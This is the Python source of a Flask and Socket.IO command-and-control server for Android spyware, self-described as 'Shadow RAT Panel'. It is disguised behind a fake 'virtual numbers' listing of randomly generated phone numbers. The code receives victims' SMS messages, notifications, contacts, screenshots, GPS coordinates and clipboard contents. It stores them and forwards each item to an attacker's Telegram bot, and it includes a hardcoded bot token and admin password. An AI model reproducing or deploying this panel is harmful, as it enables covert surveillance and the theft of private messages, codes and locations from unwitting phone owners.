from flask import Flask, render_template, request, jsonify, send_from_directory, redirect, url_for, session, flash
from flask_socketio import SocketIO, emit
import json
import os
import time
import uuid
import hashlib
import requests
import threading
from datetime import datetime
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = 'shadow_rat_secret_key_749926n'

# Use threading mode for Railway compatibility
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=True, engineio_logger=True)

# ============================================
# CONFIGURATION - YAHAN SE EDIT KARO
# ============================================
TELEGRAM_BOT_TOKEN = '8630366828:AAH2X8u_bErNhEjqUMwHLuPWWvFtvfW6TFw'
TELEGRAM_CHAT_IDS = ['7848300179']
ADMIN_PASSWORD = 'r749926n'

# Paths
DATA_DIR = os.path.join(os.path.dirname(__file__), 'data')
os.makedirs(DATA_DIR, exist_ok=True)

DEVICES_FILE = os.path.join(DATA_DIR, 'devices.json')
SMS_FILE = os.path.join(DATA_DIR, 'sms.json')
NOTIFICATIONS_FILE = os.path.join(DATA_DIR, 'notifications.json')
CONTACTS_FILE = os.path.join(DATA_DIR, 'contacts.json')
SCREENSHOTS_FILE = os.path.join(DATA_DIR, 'screenshots.json')

# ============================================
# JSON HELPERS
# ============================================
def load_json(filepath, default=None):
    if default is None:
        default = {}
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(filepath, data):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# ============================================
# TELEGRAM FUNCTIONS
# ============================================
def send_telegram_message(text, parse_mode='HTML'):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    for chat_id in TELEGRAM_CHAT_IDS:
        try:
            payload = {
                'chat_id': chat_id,
                'text': text,
                'parse_mode': parse_mode,
                'disable_web_page_preview': True
            }
            resp = requests.post(url, json=payload, timeout=15)
            print(f"Telegram response: {resp.status_code} - {resp.text[:100]}")
        except Exception as e:
            print(f"Telegram error: {e}")

def send_telegram_photo(photo_b64, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    import base64
    try:
        img_data = base64.b64decode(photo_b64.split(',')[1] if ',' in photo_b64 else photo_b64)
        for chat_id in TELEGRAM_CHAT_IDS:
            files = {'photo': ('screenshot.jpg', img_data, 'image/jpeg')}
            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'HTML'}
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        print(f"Photo error: {e}")

# ============================================
# DEVICE MANAGEMENT
# ============================================
connected_devices = {}

def get_devices():
    return load_json(DEVICES_FILE, {})

def save_device(device_id, device_info):
    devices = get_devices()
    devices[device_id] = device_info
    save_json(DEVICES_FILE, devices)

def update_device_last_seen(device_id):
    devices = get_devices()
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        devices[device_id]['status'] = 'online'
        save_json(DEVICES_FILE, devices)

def set_device_offline(device_id):
    devices = get_devices()
    if device_id in devices:
        devices[device_id]['status'] = 'offline'
        devices[device_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        save_json(DEVICES_FILE, devices)

# ============================================
# DATA STORAGE
# ============================================
def add_sms(device_id, sms_data):
    sms_db = load_json(SMS_FILE, {})
    if device_id not in sms_db:
        sms_db[device_id] = []
    sms_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    sms_db[device_id].append(sms_data)
    save_json(SMS_FILE, sms_db)

def add_notification(device_id, notif_data):
    notif_db = load_json(NOTIFICATIONS_FILE, {})
    if device_id not in notif_db:
        notif_db[device_id] = []
    notif_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    notif_db[device_id].append(notif_data)
    save_json(NOTIFICATIONS_FILE, notif_db)

def add_contact(device_id, contact_data):
    contact_db = load_json(CONTACTS_FILE, {})
    if device_id not in contact_db:
        contact_db[device_id] = []
    contact_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    contact_db[device_id].append(contact_data)
    save_json(CONTACTS_FILE, contact_db)

def add_screenshot(device_id, screenshot_data):
    ss_db = load_json(SCREENSHOTS_FILE, {})
    if device_id not in ss_db:
        ss_db[device_id] = []
    screenshot_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ss_db[device_id].append(screenshot_data)
    save_json(SCREENSHOTS_FILE, ss_db)

def get_device_history(device_id):
    devices = get_devices()
    sms_db = load_json(SMS_FILE, {})
    notif_db = load_json(NOTIFICATIONS_FILE, {})
    contact_db = load_json(CONTACTS_FILE, {})
    ss_db = load_json(SCREENSHOTS_FILE, {})
    return {
        'device': devices.get(device_id, {}),
        'sms': sms_db.get(device_id, []),
        'notifications': notif_db.get(device_id, []),
        'contacts': contact_db.get(device_id, []),
        'screenshots': ss_db.get(device_id, [])
    }

# ============================================
# VIRTUAL NUMBERS (1000+)
# ============================================
def get_virtual_numbers():
    numbers = []
    countries = [
        {"code": "US", "name": "United States", "flag": "🇺🇸", "prefix": "+1"},
        {"code": "GB", "name": "United Kingdom", "flag": "🇬🇧", "prefix": "+44"},
        {"code": "CA", "name": "Canada", "flag": "🇨🇦", "prefix": "+1"},
        {"code": "AU", "name": "Australia", "flag": "🇦🇺", "prefix": "+61"},
        {"code": "DE", "name": "Germany", "flag": "🇩🇪", "prefix": "+49"},
        {"code": "FR", "name": "France", "flag": "🇫🇷", "prefix": "+33"},
        {"code": "IN", "name": "India", "flag": "🇮🇳", "prefix": "+91"},
        {"code": "PK", "name": "Pakistan", "flag": "🇵🇰", "prefix": "+92"},
        {"code": "BD", "name": "Bangladesh", "flag": "🇧🇩", "prefix": "+880"},
        {"code": "AE", "name": "UAE", "flag": "🇦🇪", "prefix": "+971"},
        {"code": "SA", "name": "Saudi Arabia", "flag": "🇸🇦", "prefix": "+966"},
        {"code": "TR", "name": "Turkey", "flag": "🇹🇷", "prefix": "+90"},
        {"code": "ID", "name": "Indonesia", "flag": "🇮🇩", "prefix": "+62"},
        {"code": "MY", "name": "Malaysia", "flag": "🇲🇾", "prefix": "+60"},
        {"code": "PH", "name": "Philippines", "flag": "🇵🇭", "prefix": "+63"},
        {"code": "SG", "name": "Singapore", "flag": "🇸🇬", "prefix": "+65"},
        {"code": "JP", "name": "Japan", "flag": "🇯🇵", "prefix": "+81"},
        {"code": "KR", "name": "South Korea", "flag": "🇰🇷", "prefix": "+82"},
        {"code": "BR", "name": "Brazil", "flag": "🇧🇷", "prefix": "+55"},
        {"code": "MX", "name": "Mexico", "flag": "🇲🇽", "prefix": "+52"},
        {"code": "RU", "name": "Russia", "flag": "🇷🇺", "prefix": "+7"},
        {"code": "ZA", "name": "South Africa", "flag": "🇿🇦", "prefix": "+27"},
        {"code": "NG", "name": "Nigeria", "flag": "🇳🇬", "prefix": "+234"},
        {"code": "EG", "name": "Egypt", "flag": "🇪🇬", "prefix": "+20"},
        {"code": "TH", "name": "Thailand", "flag": "🇹🇭", "prefix": "+66"},
        {"code": "VN", "name": "Vietnam", "flag": "🇻🇳", "prefix": "+84"},
        {"code": "IT", "name": "Italy", "flag": "🇮🇹", "prefix": "+39"},
        {"code": "ES", "name": "Spain", "flag": "🇪🇸", "prefix": "+34"},
        {"code": "NL", "name": "Netherlands", "flag": "🇳🇱", "prefix": "+31"},
        {"code": "SE", "name": "Sweden", "flag": "🇸🇪", "prefix": "+46"},
        {"code": "PL", "name": "Poland", "flag": "🇵🇱", "prefix": "+48"},
    ]
    import random
    random.seed(42)
    for country in countries:
        for i in range(35):
            if country['code'] in ['US', 'CA']:
                number = f"{country['prefix']} ({random.randint(200,999)}) {random.randint(100,999)}-{random.randint(1000,9999)}"
            elif country['code'] == 'GB':
                number = f"{country['prefix']} {random.randint(7000,7999)} {random.randint(100000,999999)}"
            elif country['code'] == 'IN':
                number = f"{country['prefix']} {random.randint(60000,99999)} {random.randint(10000,99999)}"
            elif country['code'] == 'PK':
                number = f"{country['prefix']} {random.randint(300,399)} {random.randint(1000000,9999999)}"
            elif country['code'] == 'AE':
                number = f"{country['prefix']} {random.randint(50,59)} {random.randint(1000000,9999999)}"
            elif country['code'] == 'SA':
                number = f"{country['prefix']} {random.randint(50,59)} {random.randint(1000000,9999999)}"
            else:
                number = f"{country['prefix']} {random.randint(100000000,999999999)}"
            numbers.append({
                "id": len(numbers) + 1,
                "number": number,
                "country": country['name'],
                "flag": country['flag'],
                "code": country['code'],
                "prefix": country['prefix'],
                "status": random.choice(["Active ✅", "Active ✅", "Active ✅", "Offline ⚠️"]),
                "type": random.choice(["SMS Only", "Voice + SMS", "WhatsApp Ready", "Telegram Ready"])
            })
    return numbers

# ============================================
# AUTH
# ============================================
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# ============================================
# ROUTES
# ============================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/numbers')
def numbers_page():
    return render_template('numbers.html')

@app.route('/api/numbers')
def get_numbers():
    country = request.args.get('country', 'all')
    search = request.args.get('search', '').lower()
    numbers = get_virtual_numbers()
    if country != 'all':
        numbers = [n for n in numbers if n['code'] == country]
    if search:
        numbers = [n for n in numbers if search in n['number'].lower() or search in n['country'].lower()]
    return jsonify(numbers)

@app.route('/api/number/<int:num_id>')
def get_number_detail(num_id):
    numbers = get_virtual_numbers()
    for n in numbers:
        if n['id'] == num_id:
            return jsonify(n)
    return jsonify({"error": "Not found"}), 404

# ============================================
# DEVICE CAPTURE API (REST fallback)
# ============================================
@app.route('/api/device/capture', methods=['POST'])
def device_capture():
    data = request.get_json() or {}
    device_id = data.get('device_id') or str(uuid.uuid4())

    device_info = {
        'id': device_id,
        'model': data.get('model', 'Unknown'),
        'battery': data.get('battery', 'N/A'),
        'version': data.get('version', 'N/A'),
        'brightness': data.get('brightness', 'N/A'),
        'provider': data.get('provider', 'N/A'),
        'user_agent': data.get('user_agent', request.headers.get('User-Agent', '')),
        'ip': request.remote_addr,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'online',
        'platform': data.get('platform', 'Unknown'),
        'screen': data.get('screen', ''),
        'language': data.get('language', ''),
        'timezone': data.get('timezone', ''),
        'connection_type': 'http_fallback'
    }

    save_device(device_id, device_info)

    # Send to Telegram
    send_telegram_message(
        f"🟢 <b>NEW DEVICE CONNECTED!</b>\n\n"
        f"📱 Model: <b>{device_info['model']}</b>\n"
        f"🔋 Battery: <b>{device_info['battery']}</b>\n"
        f"🤖 Android: <b>{device_info['version']}</b>\n"
        f"💡 Brightness: <b>{device_info['brightness']}</b>\n"
        f"📡 Provider: <b>{device_info['provider']}</b>\n"
        f"🌐 IP: <code>{device_info['ip']}</code>\n"
        f"📊 Platform: {device_info['platform']}\n"
        f"🖥️ Screen: {device_info['screen']}\n"
        f"🌍 Language: {device_info['language']}\n"
        f"⏰ Timezone: {device_info['timezone']}\n"
        f"⏱️ Time: {device_info['first_seen']}"
    )

    return jsonify({'success': True, 'device_id': device_id})

@app.route('/api/device/<device_id>/ping', methods=['POST'])
def device_ping(device_id):
    update_device_last_seen(device_id)
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/sms', methods=['POST'])
def device_sms(device_id):
    data = request.get_json() or {}
    sms_data = {
        'from': data.get('from', 'Unknown'),
        'body': data.get('body', ''),
        'type': 'incoming'
    }
    add_sms(device_id, sms_data)
    device = get_devices().get(device_id, {})
    send_telegram_message(
        f"💬 <b>NEW SMS RECEIVED</b>\n\n"
        f"📱 Device: <b>{device.get('model', 'Unknown')}</b>\n"
        f"📤 From: <code>{sms_data['from']}</code>\n"
        f"📝 Message: <pre>{sms_data['body']}</pre>"
    )
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/notification', methods=['POST'])
def device_notification(device_id):
    data = request.get_json() or {}
    notif_data = {
        'title': data.get('title', ''),
        'body': data.get('body', ''),
        'app': data.get('app', ''),
        'package': data.get('package', '')
    }
    add_notification(device_id, notif_data)
    device = get_devices().get(device_id, {})
    send_telegram_message(
        f"🔔 <b>NEW NOTIFICATION</b>\n\n"
        f"📱 Device: <b>{device.get('model', 'Unknown')}</b>\n"
        f"📲 App: <b>{notif_data['app']}</b>\n"
        f"📌 Title: <b>{notif_data['title']}</b>\n"
        f"📝 Body: <pre>{notif_data['body']}</pre>"
    )
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/contacts', methods=['POST'])
def device_contacts(device_id):
    data = request.get_json() or {}
    contacts = data.get('contacts', [])
    for contact in contacts:
        add_contact(device_id, contact)
    device = get_devices().get(device_id, {})
    send_telegram_message(
        f"👥 <b>CONTACTS SYNCED</b>\n\n"
        f"📱 Device: <b>{device.get('model', 'Unknown')}</b>\n"
        f"👤 Total: <b>{len(contacts)}</b> contacts"
    )
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/screenshot', methods=['POST'])
def device_screenshot(device_id):
    data = request.get_json() or {}
    screenshot_b64 = data.get('image', '')
    if screenshot_b64:
        add_screenshot(device_id, {'image': screenshot_b64[:100] + '...'})
        device = get_devices().get(device_id, {})
        caption = f"📸 <b>SCREENSHOT</b>\n📱 {device.get('model', 'Unknown')}"
        send_telegram_photo(screenshot_b64, caption)
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/location', methods=['POST'])
def device_location(device_id):
    data = request.get_json() or {}
    lat = data.get('lat')
    lon = data.get('lon')
    device = get_devices().get(device_id, {})
    send_telegram_message(
        f"📍 <b>LOCATION</b>\n\n"
        f"📱 {device.get('model', 'Unknown')}\n"
        f"🗺️ <code>{lat}, {lon}</code>\n"
        f"🔗 https://maps.google.com/?q={lat},{lon}"
    )
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/clipboard', methods=['POST'])
def device_clipboard(device_id):
    data = request.get_json() or {}
    text = data.get('text', '')
    device = get_devices().get(device_id, {})
    send_telegram_message(
        f"📋 <b>CLIPBOARD</b>\n\n"
        f"📱 {device.get('model', 'Unknown')}\n"
        f"📝 <pre>{text[:500]}</pre>"
    )
    return jsonify({'success': True})

# ============================================
# SOCKET.IO EVENTS
# ============================================
@socketio.on('connect')
def handle_connect():
    print(f"Socket connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    device_id = None
    for did, sid in list(connected_devices.items()):
        if sid == request.sid:
            device_id = did
            break
    if device_id:
        set_device_offline(device_id)
        device = get_devices().get(device_id, {})
        send_telegram_message(
            f"🔴 <b>DEVICE DISCONNECTED</b>\n\n"
            f"📱 {device.get('model', 'Unknown')}\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        if device_id in connected_devices:
            del connected_devices[device_id]

@socketio.on('device_register')
def handle_device_register(data):
    device_id = str(uuid.uuid4())
    device_info = {
        'id': device_id,
        'model': data.get('model', 'Unknown'),
        'battery': data.get('battery', 'N/A'),
        'version': data.get('version', 'N/A'),
        'brightness': data.get('brightness', 'N/A'),
        'provider': data.get('provider', 'N/A'),
        'user_agent': data.get('user_agent', request.headers.get('User-Agent', '')),
        'ip': request.remote_addr,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'online',
        'platform': data.get('platform', 'Unknown'),
        'screen': data.get('screen', ''),
        'language': data.get('language', ''),
        'timezone': data.get('timezone', ''),
        'connection_type': 'websocket'
    }
    save_device(device_id, device_info)
    connected_devices[device_id] = request.sid

    send_telegram_message(
        f"🟢 <b>NEW DEVICE (WebSocket)</b>\n\n"
        f"📱 Model: <b>{device_info['model']}</b>\n"
        f"🔋 Battery: <b>{device_info['battery']}</b>\n"
        f"🤖 Android: <b>{device_info['version']}</b>\n"
        f"💡 Brightness: <b>{device_info['brightness']}</b>\n"
        f"📡 Provider: <b>{device_info['provider']}</b>\n"
        f"🌐 IP: <code>{device_info['ip']}</code>\n"
        f"📊 Platform: {device_info['platform']}\n"
        f"🖥️ Screen: {device_info['screen']}\n"
        f"🌍 Language: {device_info['language']}\n"
        f"⏰ Timezone: {device_info['timezone']}\n"
        f"⏱️ Time: {device_info['first_seen']}"
    )

    emit('registered', {'device_id': device_id})

@socketio.on('device_ping')
def handle_device_ping(data):
    device_id = data.get('device_id')
    if device_id and device_id in connected_devices:
        update_device_last_seen(device_id)

@socketio.on('sms_received')
def handle_sms(data):
    device_id = data.get('device_id')
    if device_id:
        sms_data = {'from': data.get('from', 'Unknown'), 'body': data.get('body', ''), 'type': 'incoming'}
        add_sms(device_id, sms_data)
        device = get_devices().get(device_id, {})
        send_telegram_message(
            f"💬 <b>NEW SMS</b>\n\n"
            f"📱 {device.get('model', 'Unknown')}\n"
            f"📤 From: <code>{sms_data['from']}</code>\n"
            f"📝 <pre>{sms_data['body']}</pre>"
        )

@socketio.on('notification_received')
def handle_notification(data):
    device_id = data.get('device_id')
    if device_id:
        notif_data = {'title': data.get('title', ''), 'body': data.get('body', ''), 'app': data.get('app', ''), 'package': data.get('package', '')}
        add_notification(device_id, notif_data)
        device = get_devices().get(device_id, {})
        send_telegram_message(
            f"🔔 <b>NOTIFICATION</b>\n\n"
            f"📱 {device.get('model', 'Unknown')}\n"
            f"📲 {notif_data['app']}\n"
            f"📌 {notif_data['title']}\n"
            f"📝 <pre>{notif_data['body']}</pre>"
        )

@socketio.on('contacts_received')
def handle_contacts(data):
    device_id = data.get('device_id')
    if device_id:
        contacts = data.get('contacts', [])
        for contact in contacts:
            add_contact(device_id, contact)
        device = get_devices().get(device_id, {})
        send_telegram_message(f"👥 <b>CONTACTS</b>\n📱 {device.get('model', 'Unknown')}\n👤 {len(contacts)} contacts")

@socketio.on('screenshot')
def handle_screenshot(data):
    device_id = data.get('device_id')
    screenshot_b64 = data.get('image', '')
    if device_id and screenshot_b64:
        add_screenshot(device_id, {'image': screenshot_b64[:100] + '...'})
        device = get_devices().get(device_id, {})
        caption = f"📸 <b>SCREENSHOT</b>\n📱 {device.get('model', 'Unknown')}"
        send_telegram_photo(screenshot_b64, caption)

@socketio.on('location')
def handle_location(data):
    device_id = data.get('device_id')
    if device_id:
        lat = data.get('lat')
        lon = data.get('lon')
        device = get_devices().get(device_id, {})
        send_telegram_message(
            f"📍 <b>LOCATION</b>\n📱 {device.get('model', 'Unknown')}\n"
            f"🗺️ <code>{lat}, {lon}</code>\n🔗 https://maps.google.com/?q={lat},{lon}"
        )

@socketio.on('clipboard')
def handle_clipboard(data):
    device_id = data.get('device_id')
    if device_id:
        text = data.get('text', '')
        device = get_devices().get(device_id, {})
        send_telegram_message(f"📋 <b>CLIPBOARD</b>\n📱 {device.get('model', 'Unknown')}\n📝 <pre>{text[:500]}</pre>")

# ============================================
# ADMIN PANEL
# ============================================
@app.route('/admin')
def admin_login():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_dashboard'))
    return render_template('admin_login.html')

@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    password = request.form.get('password', '')
    if password == ADMIN_PASSWORD:
        session['admin_logged_in'] = True
        return redirect(url_for('admin_dashboard'))
    flash('Invalid password!', 'error')
    return redirect(url_for('admin_login'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    devices = get_devices()
    online_count = sum(1 for d in devices.values() if d.get('status') == 'online')
    return render_template('admin_dashboard.html', devices=devices, online_count=online_count, total_count=len(devices))

@app.route('/admin/device/<device_id>')
@admin_required
def admin_device_detail(device_id):
    history = get_device_history(device_id)
    return render_template('admin_device.html', history=history, device_id=device_id)

@app.route('/admin/api/device/<device_id>/history')
@admin_required
def api_device_history(device_id):
    return jsonify(get_device_history(device_id))

@app.route('/admin/api/devices')
@admin_required
def api_devices():
    return jsonify(get_devices())

@app.route('/admin/api/clear/<device_id>')
@admin_required
def clear_device_data(device_id):
    for f in [SMS_FILE, NOTIFICATIONS_FILE, CONTACTS_FILE, SCREENSHOTS_FILE]:
        data = load_json(f, {})
        if device_id in data:
            del data[device_id]
            save_json(f, data)
    return jsonify({'status': 'success'})

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Shadow RAT Panel on port {port}")
    print(f"🤖 Bot Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"💬 Chat IDs: {TELEGRAM_CHAT_IDS}")
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
